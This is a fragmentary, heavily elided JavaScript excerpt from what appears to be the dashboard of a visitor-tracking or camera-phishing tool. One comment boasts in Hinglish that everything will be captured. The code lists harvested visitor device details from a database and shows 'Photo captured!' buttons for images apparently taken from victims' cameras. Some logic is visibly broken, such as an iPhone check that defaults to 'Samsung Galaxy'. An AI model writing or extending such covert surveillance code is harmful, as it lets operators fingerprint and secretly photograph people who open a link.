...
// ========== COMPLETE DEVICE INFO (FIXED - SAB CAPTURE HOGA) ==========
async function getAdvancedDeviceInfo() {
    ...
    if (ua.includes('iPhone')) {
        ...
        deviceModel = match ? match[0] : 'Samsung Galaxy';
...
async function showRecent() {
    ...
    try {
        ...
        for (const [code] of Object.entries(snapshot.val() || {})) {
            ...
            analyticsSnapshot.forEach(analytic => {
                ...
                allVisitors.push({
                    ...
                    screen: data.screen_width && data.screen_height ? `${data.screen_width}x${data.screen_height}` : 'Unknown',
        ...
        const html = recent.map(v => `
            <div class="data-item">
                ...
                <div class="data-item-stats">
                    ...
                    ${v.screen && v.screen !== 'Unknown' ? `<span><i class="fas fa-desktop"></i> ${v.screen}</span>` : ''}
                </div>
                <div class="data-item-stats">
                    ${v.language ? `<span><i class="fas fa-language"></i> ${v.language}</span>` : ''}
                ...
                ${v.camera ? `<div class="data-item-stats" style="color: #00ff41;"><i class="fas fa-camera"></i> Photo captured! <button class="data-btn-sm" onclick="viewPhoto('${v.camera.replace(/'/g, "\\'")}')"><i class="fas fa-eye"></i> View</button></div>` : ''}
                <div class="data-item-actions">
        ...
        updateDisplay('RECENT ACTIVITY', 'fa-exclamation-triangle', '<div class="empty-data">Error</div>');
    }
}
        ...
        if (analytics.length === 0) {
            ...
            html += analytics.map(v => `
                <div class="data-item">
                    ...
                    <div class="data-item-stats"><strong><i class="fas fa-desktop"></i> Screen:</strong> ${v.screen_width && v.screen_height ? v.screen_width+'x'+v.screen_height : 'Unknown'} | <strong>Ratio:</strong> ${v.device_pixel_ratio || '1'}</div>
                    ...
                    ${v.captured_image && v.captured_image !== 'black_screen' ? `<div class="data-item-stats" style="color: #00ff41;"><i class="fas fa-camera"></i> Photo captured! <button class="data-btn-sm" onclick="viewPhoto('${v.captured_image.replace(/'/g, "\\'")}')"><i class="fas fa-eye"></i> View Photo</button></div>` : ''}
                </div>
            `).join('');
        }
